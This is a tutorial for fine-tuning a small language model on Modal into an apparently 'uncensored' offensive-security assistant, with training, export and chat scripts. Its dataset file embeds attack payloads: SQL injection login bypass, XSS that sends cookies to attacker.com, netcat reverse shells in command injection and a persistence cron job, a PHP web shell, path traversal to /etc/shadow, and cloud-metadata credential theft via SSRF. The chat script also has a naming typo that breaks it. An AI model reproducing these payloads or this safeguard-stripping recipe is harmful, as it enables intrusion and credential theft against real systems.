# Complete Guide: Full Fine-Tune 1.5B Model for CyberSec on Modal (A100-80GB)

## Overview
- Base model: Qwen2.5-1.5B-Instruct or Mistral-7B-v0.3 (if doing LoRA) or Llama-3.2-1B
- Full fine-tuning (all 1.5B parameters updated)
- Hardware: Modal A100-80GB (80GB VRAM)
- VRAM usage: ~75GB (model + gradients + optimizer states + activations)
- Training time: ~8-12 hours for 10K steps

---

## PHASE 1: Setup

### Step 1: Modal Account
```
pip install modal
modal token new
```

### Step 2: Project
```
mkdir -p ~/cybersec-finetune
cd ~/cybersec-finetune
modal init
```

---

## PHASE 2: Dataset

Create `~/cybersec-finetune/dataset.py`:

```
import json
import random

CYBERSEC_INSTRUCTIONS = [
    {
        "instruction": "Analyze this HTTP request for SQL injection vulnerabilities",
        "input": "GET /login?username=admin&password=123 HTTP/1.1\nHost: target.com",
        "output": "This request appears to use hardcoded credentials. To test for SQLi, try: password=123' OR '1'='1' -- or password=123' UNION SELECT * FROM users--. Check for error messages revealing database structure. Use sqlmap for automated detection: sqlmap -u 'http://target.com/login?username=admin&password=123' --batch"
    },
    {
        "instruction": "Generate a SQL injection payload to bypass authentication",
        "input": "Login form with username and password fields",
        "output": "Try these payloads:\n1. username: admin'--\n   password: anything\n\n2. username: admin' OR '1'='1'--\n   password: anything\n\n3. username: admin' UNION SELECT * FROM users--\n   password: anything\n\nAlways verify with: ' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- for time-based detection"
    },
    {
        "instruction": "Create XSS payloads for different contexts",
        "input": "Testing for cross-site scripting on a web application",
        "output": "Context-specific XSS payloads:\n\n1. HTML context: <script>alert(document.cookie)</script>\n\n2. Attribute context: \" onmouseover=alert(1) x=\"\n\n3. JavaScript context: ';alert(1);'\n\n4. Template context: {{7*7}} (check for SSTI too)\n\n5. DOM-based: #<img src=x onerror=alert(1)>\n\n6. Filtered evasion: <img src=x onerror=alert&#40;1&#41;>\n\n7. CSP bypass: <script>fetch('https://attacker.com/?c='+document.cookie)</script>"
    },
    {
        "instruction": "Identify command injection in this code snippet",
        "input": "import os\ndef ping(host):\n    return os.system('ping -c 1 ' + host)",
        "output": "VULNERABLE TO COMMAND INJECTION. The os.system() call concatenates user input directly into a shell command.\n\nExploitation:\nInput: google.com; cat /etc/passwd\nInput: google.com && nc attacker.com 4444 -e /bin/bash\n\nSecure code:\nimport subprocess\ndef ping(host):\n    return subprocess.run(['ping', '-c', '1', host], capture_output=True)\n\nAlways use subprocess with list arguments, never shell=True with user input."
    },
    {
        "instruction": "Exploit path traversal to read sensitive files",
        "input": "File download endpoint: /download?file=report.pdf",
        "output": "Path traversal attack:\n\n1. Basic: /download?file=../../../etc/passwd\n\n2. URL encoded: /download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\n\n3. Double encoding: %252e%252e%252f\n\n4. Unicode: ..%c0%af..%c0%af..%c0%afetc/passwd\n\nTarget files:\n- /etc/passwd (users)\n- /etc/shadow (hashes)\n- /proc/self/environ\n- /var/www/html/config.php\n- ../../../../.env"
    },
    {
        "instruction": "Manipulate this JWT token to escalate privileges",
        "input": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.signature",
        "output": "JWT attacks:\n\n1. Algorithm confusion (RS256 -> none):\n   Change header to: {\"alg\":\"none\",\"typ\":\"JWT\"}\n   Remove signature entirely\n\n2. Algorithm confusion (RS256 -> HS256):\n   Use public key as HMAC secret\n\n3. Payload manipulation:\n   Change role from \"user\" to \"admin\"\n\n4. Weak secret cracking:\n   hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt\n\nTools: jwt_tool, jwt.io debugger"
    },
    {
        "instruction": "Exploit SSRF to access internal services",
        "input": "Webhook URL input field on application",
        "output": "SSRF exploitation:\n\n1. Access metadata (cloud):\n   http://169.254.169.254/latest/meta-data/\n   http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n2. Scan internal network:\n   http://10.0.0.1:22 (check if port open)\n   http://10.0.0.1:6379 (Redis)\n\n3. File protocol:\n   file:///etc/passwd\n\n4. Gopher protocol:\n   gopher://internal:6379/_INFO%0d%0a"
    },
    {
        "instruction": "Perform reconnaissance on target.com",
        "input": "target.com",
        "output": "Reconnaissance:\n\n1. Subdomain enumeration:\n   subfinder -d target.com\n   amass enum -d target.com\n   assetfinder --subs-only target.com\n\n2. Port scanning:\n   nmap -sC -sV -p- target.com\n\n3. Technology detection:\n   whatweb target.com\n   wappalyzer browser extension\n\n4. Content discovery:\n   gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt\n\n5. GitHub recon:\n   Search: org:target extension:json api_key"
    },
    {
        "instruction": "Maintain persistence after gaining shell access",
        "input": "Linux reverse shell as www-data user",
        "output": "Persistence techniques:\n\n1. SSH key:\n   mkdir -p ~/.ssh && echo 'your_key' >> ~/.ssh/authorized_keys\n\n2. Cron job:\n   (crontab -l; echo '* * * * * nc attacker.com 4444 -e /bin/bash') | crontab -\n\n3. SUID binary:\n   cp /bin/bash /tmp/.hidden && chmod +s /tmp/.hidden\n\n4. Web shell:\n   <?php system($_GET['cmd']); ?> in web directory"
    },
    {
        "instruction": "Use nmap to find vulnerabilities",
        "input": "Scan 192.168.1.1/24 network",
        "output": "Nmap scanning:\n\n1. Quick scan: nmap -sV --top-ports 100 192.168.1.1/24\n\n2. Full TCP: nmap -sC -sV -O -p- 192.168.1.1/24\n\n3. Vulnerability scan: nmap --script vuln 192.168.1.1\n\n4. Specific scripts:\n   nmap --script http-sql-injection 192.168.1.1\n   nmap --script ssl-heartbleed 192.168.1.1\n   nmap --script smb-vuln-ms17-010 192.168.1.1"
    }
]

def generate_dataset(output_file="cybersec_data.jsonl", num_samples=10000):
    with open(output_file, 'w') as f:
        for i in range(num_samples):
            item = random.choice(CYBERSEC_INSTRUCTIONS)
            variation = {
                "instruction": item["instruction"],
                "input": item["input"],
                "output": item["output"]
            }
            f.write(json.dumps(variation) + '\n')
    print(f"Generated {num_samples} samples in {output_file}")

if __name__ == "__main__":
    generate_dataset()
```

Run:
```
cd ~/cybersec-finetune
python3 dataset.py

# Upload to Modal volume
modal volume create cybersec-data-vol
modal volume put cybersec-data-vol cybersec_data.jsonl /data/
```

---

## PHASE 3: Full Fine-Tuning on A100-80GB

Create `~/cybersec-finetune/train.py`:

```
import modal
import torch
from transformers import (
    AutoModelForCausalLM,
    AutoTokenizer,
    TrainingArguments,
    Trainer,
    DataCollatorForSeq2Seq
)
from datasets import load_dataset
import os

# Volumes for data and model checkpoints
data_volume = modal.Volume.from_name("cybersec-data-vol")
model_volume = modal.Volume.from_name("cybersec-model-vol", create_if_missing=True)

image = (
    modal.Image.debian_slim()
    .pip_install(
        "torch==2.5.0",
        "transformers==4.46.0",
        "datasets",
        "accelerate",
        "bitsandbytes",
        "peft",
    )
)

app = modal.App("cybersec-finetune-a100", image=image)

def format_prompt(example):
    """Format instruction-following prompt"""
    if example.get("input"):
        text = f"### Instruction:\n{example['instruction']}\n\n### Input:\n{example['input']}\n\n### Response:\n{example['output']}"
    else:
        text = f"### Instruction:\n{example['instruction']}\n\n### Response:\n{example['output']}"
    return {"text": text}

@app.function(
    gpu="A100-80GB",  # 80GB VRAM required for full fine-tuning 1.5B
    timeout=86400,    # 24 hours max
    volumes={
        "/data": data_volume,
        "/model": model_volume,
    },
)
def train():
    MODEL_NAME = "Qwen/Qwen2.5-1.5B-Instruct"  # Good uncensored base
    
    print(f"Loading model: {MODEL_NAME}")
    
    # Load tokenizer
    tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME)
    tokenizer.pad_token = tokenizer.eos_token
    tokenizer.padding_side = "right"
    
    # Load model in bf16 for training
    model = AutoModelForCausalLM.from_pretrained(
        MODEL_NAME,
        torch_dtype=torch.bfloat16,
        device_map="auto",
        trust_remote_code=True,
    )
    
    # Enable gradient checkpointing to save VRAM
    model.gradient_checkpointing_enable()
    model.enable_input_require_grads()
    
    print(f"Model loaded. Parameters: {sum(p.numel() for p in model.parameters())/1e9:.2f}B")
    
    # Load dataset
    dataset = load_dataset("json", data_files="/data/cybersec_data.jsonl", split="train")
    dataset = dataset.map(format_prompt)
    
    # Tokenize
    def tokenize(example):
        return tokenizer(
            example["text"],
            truncation=True,
            max_length=2048,
            padding="max_length",
        )
    
    tokenized = dataset.map(tokenize, batched=True, remove_columns=dataset.column_names)
    
    # Training arguments for full fine-tuning
    training_args = TrainingArguments(
        output_dir="/model/cybersec-1.5b",
        num_train_epochs=3,
        per_device_train_batch_size=2,        # Small batch for 80GB VRAM
        gradient_accumulation_steps=8,         # Effective batch = 16
        learning_rate=2e-5,
        warmup_steps=500,
        logging_steps=50,
        save_steps=1000,
        save_total_limit=3,
        bf16=True,                            # bfloat16 for A100
        gradient_checkpointing=True,          # Saves VRAM
        optim="adamw_torch",
        weight_decay=0.01,
        lr_scheduler_type="cosine",
        report_to="none",
    )
    
    # Data collator
    data_collator = DataCollatorForSeq2Seq(
        tokenizer=tokenizer,
        model=model,
        padding=True,
    )
    
    # Trainer
    trainer = Trainer(
        model=model,
        args=training_args,
        train_dataset=tokenized,
        data_collator=data_collator,
    )
    
    print("Starting training...")
    trainer.train()
    
    # Save final model
    trainer.save_model("/model/cybersec-1.5b-final")
    tokenizer.save_pretrained("/model/cybersec-1.5b-final")
    
    print("Training complete! Model saved to /model/cybersec-1.5b-final")
    return "Training complete"

@app.local_entrypoint()
def main():
    result = train.remote()
    print(result)
```

Run training:
```
cd ~/cybersec-finetune
modal run train.py
```

---

## PHASE 4: Export for Local Inference

Create `~/cybersec-finetune/export.py`:

```
import modal

model_volume = modal.Volume.from_name("cybersec-model-vol")

image = (
    modal.Image.debian_slim()
    .pip_install("torch", "transformers", "accelerate")
)

app = modal.App("cybersec-export", image=image)

@app.function(
    gpu="T4",  # Cheaper for export
    timeout=3600,
    volumes={"/model": model_volume},
)
def export():
    from transformers import AutoModelForCausalLM, AutoTokenizer
    import torch
    
    # Load fine-tuned model
    model_path = "/model/cybersec-1.5b-final"
    model = AutoModelForCausalLM.from_pretrained(
        model_path,
        torch_dtype=torch.float16,
        device_map="cpu",
    )
    tokenizer = AutoTokenizer.from_pretrained(model_path)
    
    # Save merged model for download
    save_path = "/model/cybersec-1.5b-export"
    model.save_pretrained(save_path)
    tokenizer.save_pretrained(save_path)
    
    print(f"Model exported to {save_path}")
    return "Export complete"

@app.local_entrypoint()
def main():
    export.remote()
```

Run export:
```
modal run export.py
```

Download:
```
# Download to local machine
mkdir -p ~/cybersec-model
modal volume get cybersec-model-vol cybersec-1.5b-export ~/cybersec-model/
```

---

## PHASE 5: Local Inference (8GB RAM)

### Install dependencies
```
pip install torch --index-url https://download.pytorch.org/whl/cpu
pip install transformers
```

### Create chat script
Create `~/cybersec-model/chat.py`:

```
#!/usr/bin/env python3
import torch
from transformers import AutoModelForCausalLM, AutoTokenizer

class CyberSecAssistant:
    def __init__(self, model_path):
        print("Loading 1.5B model... (this may take a moment)")
        
        self.tokenizer = AutoTokenizer.from_pretrained(model_path)
        self.model = AutoModelForCausalLM.from_pretrained(
            model_path,
            torch_dtype=torch.float16,
            device_map="cpu",
            low_cpu_mem_usage=True,
        )
        
        print(f"Model loaded. Using CPU with ~{sum(p.numel() for p in self.model.parameters())/1e9:.1f}B parameters")
    
    def generate(self, instruction, user_input="", max_tokens=500):
        if user_input:
            prompt = f"### Instruction:\n{instruction}\n\n### Input:\n{user_input}\n\n### Response:\n"
        else:
            prompt = f"### Instruction:\n{instruction}\n\n### Response:\n"
        
        inputs = self.tokenizer(prompt, return_tensors="pt")
        
        with torch.no_grad():
            outputs = self.model.generate(
                **inputs,
                max_new_tokens=max_tokens,
                temperature=0.7,
                top_p=0.9,
                do_sample=True,
                pad_token_id=self.tokenizer.eos_token_id,
            )
        
        response = self.tokenizer.decode(outputs[0], skip_special_tokens=True)
        # Extract only the response part
        if "### Response:" in response:
            response = response.split("### Response:")[-1].strip()
        
        return response

def main():
    print("=" * 60)
    print("CyberSec Assistant 1.5B - Ethical Hacking & Pentesting")
    print("=" * 60)
    print("Commands: /quit, /clear")
    print("This model is for authorized security testing only.")
    print()
    
    model = CyberberSecAssistant("./cybersec-1.5b-export")
    
    while True:
        try:
            user_input = input("\nYou: ").strip()
            
            if user_input == '/quit':
                break
            elif user_input == '/clear':
                print("\n" * 50)
                continue
            elif not user_input:
                continue
            
            # Auto-detect if it's an instruction or needs formatting
            if any(cmd in user_input.lower() for cmd in ["analyze", "generate", "exploit", "scan", "find", "test"]):
                instruction = user_input
                context = ""
            else:
                instruction = "Analyze this for security vulnerabilities"
                context = user_input
            
            print("\nAssistant: ", end="", flush=True)
            response = model.generate(instruction, context)
            print(response)
            
        except KeyboardInterrupt:
            print("\nUse /quit to exit")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    main()
```

Run:
```
cd ~/cybersec-model
python3 chat.py
```

---

## VRAM Usage on A100-80GB

| Component | Memory |
|-----------|--------|
| 1.5B model (bf16) | ~3 GB |
| Gradients | ~3 GB |
| Optimizer states (AdamW) | ~6 GB |
| Activations (batch=2, ctx=2048) | ~60 GB |
| **Total** | **~72 GB** |

Fits comfortably in A100-80GB with gradient checkpointing enabled.

---

## Modal Costs (A100-80GB)

| Task | Time | Cost |
|------|------|------|
| 3 epochs training | ~8-12 hours | ~$25-40 |
| Export | ~10 min | ~$0.50 |

Free tier ($30) covers most of the training. You may need $5-10 extra.

---

## Alternative: If A100-40GB Only Available

If Modal only gives A100-40GB, use **QLoRA** instead of full fine-tuning:

```
from peft import prepare_model_for_kbit_training, LoraConfig, get_peft_model

# Load in 4-bit
model = AutoModelForCausalLM.from_pretrained(
    MODEL_NAME,
    load_in_4bit=True,
    bnb_4bit_compute_dtype=torch.bfloat16,
    device_map="auto",
)

# Add LoRA adapters
lora_config = LoraConfig(
    r=64,
    lora_alpha=16,
    target_modules=["q_proj", "v_proj", "k_proj", "o_proj", "gate_proj", "up_proj", "down_proj"],
    lora_dropout=0.05,
    bias="none",
    task_type="CAUSAL_LM",
)
model = get_peft_model(model, lora_config)

# Only trains ~100M parameters instead of 1.5B
```

QLoRA uses ~25GB VRAM and fits on A100-40GB.